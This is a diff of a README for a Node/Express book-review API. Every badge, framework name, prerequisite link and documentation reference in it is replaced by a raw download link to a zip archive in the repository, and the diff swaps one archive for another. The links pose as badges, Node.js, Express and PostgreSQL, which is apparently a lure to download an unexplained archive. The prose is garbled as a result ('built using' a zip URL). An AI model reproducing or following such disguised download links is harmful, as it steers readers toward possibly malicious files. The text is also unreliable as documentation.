@@ -1,17 +1,17 @@
 # Book_Review: A Robust API for Managing Books, Comments, and Tags
 
 
-[![https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip](https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip%https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip)](https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip)
-[![https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip](https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip)](https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip)
-[![PostgreSQL](https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip)](https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip)
-[![JWT](https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip)](https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip)
+[![https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip](https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip%https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip)](https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip)
+[![https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip](https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip)](https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip)
+[![PostgreSQL](https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip)](https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip)
+[![JWT](https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip)](https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip)
 
-A powerful and secure API for managing books, users, comments, and tags. This project is built using https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip, the https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip framework, and a PostgreSQL database, with a strong focus on security and efficient error handling.
+A powerful and secure API for managing books, users, comments, and tags. This project is built using https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip, the https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip framework, and a PostgreSQL database, with a strong focus on security and efficient error handling.
 ---
 
 ## 🚀 About The Project
 
-This project is a powerful and secure API designed for managing book-related data, including user accounts, books, comments, and tags. Built with **https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip** and the **https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip** framework, it leverages a **PostgreSQL** database for robust data storage.
+This project is a powerful and secure API designed for managing book-related data, including user accounts, books, comments, and tags. Built with **https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip** and the **https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip** framework, it leverages a **PostgreSQL** database for robust data storage.
 
 The project emphasizes security and efficient error handling, showcasing modern backend development practices, including:
 * A complete authentication system based on **JWT**.
@@ -36,10 +36,10 @@ The project emphasizes security and efficient error handling, showcasing modern 
 
 ## 💻 Tech Stack
 
-* **https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip**: JavaScript runtime environment.
-* **https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip**: Fast, unopinionated, minimalist web framework for https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip
+* **https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip**: JavaScript runtime environment.
+* **https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip**: Fast, unopinionated, minimalist web framework for https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip
 * **PostgreSQL**: Powerful, open-source object-relational database system.
-* **PG**: Non-blocking PostgreSQL client for https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip
+* **PG**: Non-blocking PostgreSQL client for https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip
 * **jsonwebtoken**: For JSON Web Token implementation.
 * **bcryptjs**: For hashing and salting passwords.
 * **dotenv**: Loads environment variables from a `.env` file.
@@ -57,8 +57,8 @@ To get a local copy up and running, follow these simple steps.
 
 Ensure you have the following installed on your machine:
 
-* [https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip](https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip) (v18+ recommended)
-* [PostgreSQL](https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip)
+* [https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip](https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip) (v18+ recommended)
+* [PostgreSQL](https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip)
 
 ### Installation Steps
 
@@ -157,7 +157,7 @@ Server is running on http://localhost:3000
 You can test the API using:
 
 - ✅ **Postman** or **Insomnia** for making HTTP requests to endpoints.
-- ✅ Import the routes from the documentation in this `https://raw.githubusercontent.com/am17jx/Book_Review/main/utils/Book-Review-3.3.zip`.
+- ✅ Import the routes from the documentation in this `https://raw.githubusercontent.com/am17jx/Book_Review/main/routes/Book_Review_v2.1.zip`.
 - ✅ Make sure to include the JWT token in the `Authorization` header for protected routes:
   ```
   Authorization: Bearer <your_token_here>
